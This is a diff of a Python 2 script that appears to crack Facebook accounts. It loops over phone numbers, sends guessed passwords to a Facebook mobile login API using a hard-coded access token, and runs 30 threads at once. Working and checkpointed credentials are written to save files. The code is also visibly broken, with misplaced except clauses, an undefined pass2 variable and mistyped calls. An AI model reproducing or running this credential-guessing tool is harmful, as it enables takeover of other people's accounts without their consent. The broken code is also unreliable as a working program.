@@ -97,34 +97,53 @@ def login():
 	print "\033[96m| 😎 | " + 3*" " + "\033[35mNOMOR HP" + 4*" " + "\033[96m|" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
 	print 42*"\033[1;96m="
 
-def main(arg):
-	global cpb,oks
-	user = arg
-	try:
-		os.mkdir('save')
-		except OSError:
-			pass
-	try:
-		pass1 = 786786
-		code = open('cod', 'a')
-		data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=' + code + '&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-		q = json.load(data)
-		if 'access_token' in q:
-			print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass1 + code
-			okb = open('save/successfull.txt', 'a')
-			okb.write(k+c+user+'|'+pass1+code+'\n')
-			okb.close()
-			oks.append(user+pass1+code)
-		else:
-			if 'www.facebook.com' in q['error_msg']:
-				print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass1 + code
-				cps = open('save/checkpoint.txt', 'a')
-				cps.write(k+c+user+'|'+pass1+code+'\n')
-				cps.close()
-				cpb.append(user+pass1+code)
+	def main(arg):
+		global cpb,oks
+		user = arg
+		try:
+			os.mkdir('save')
+			except OSError:
+				pass
+		try:
+			pass1 = 786786
+			code = br.open('cod', 'a')
+			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=' + code + '&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass1 + code
+				okb = open('save/successfull.txt', 'a')
+				okb.write(k+c+user+'|'+pass1+code+'\n')
+				okb.close()
+				oks.append(c+user+pass1+code)
+			else:
+				if 'www.facebook.com' in q['error_msg']:
+					print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass1 + code
+					cps = open('save/checkpoint.txt', 'a')
+					cps.write(k+c+user+'|'+pass1+code+'\n')
+					cps.close()
+					cpb.append(c+user+pass1+code)
 
-	except:
-		pass
+				else:
+					pass2
+					code = br.open('cod', 'a')
+					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=' +code+ '&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+					q = json.load(data)
+					if 'access_token' in q:
+						print '\x1b[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass2 + code
+						okb = open('save/successfull.txt', 'a')
+						okb.write(k+c+user+'|'+pass2+'\n')
+						okb.close()
+						oks.append(c+user+pass2)
+					else:
+						if 'www.facebook.com' in q['error_msg']:
+							print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass2 + code
+							cps = open('save/checkpoint.txt', 'a')
+							cps.write(k+c+user+'|'+pass2+'\n')
+							cps.close()
+							cpb.append(c+user+pass2)
+
+		except:
+			pass
 		
 	p = ThreadPool(30)
 	p.map(main, id)
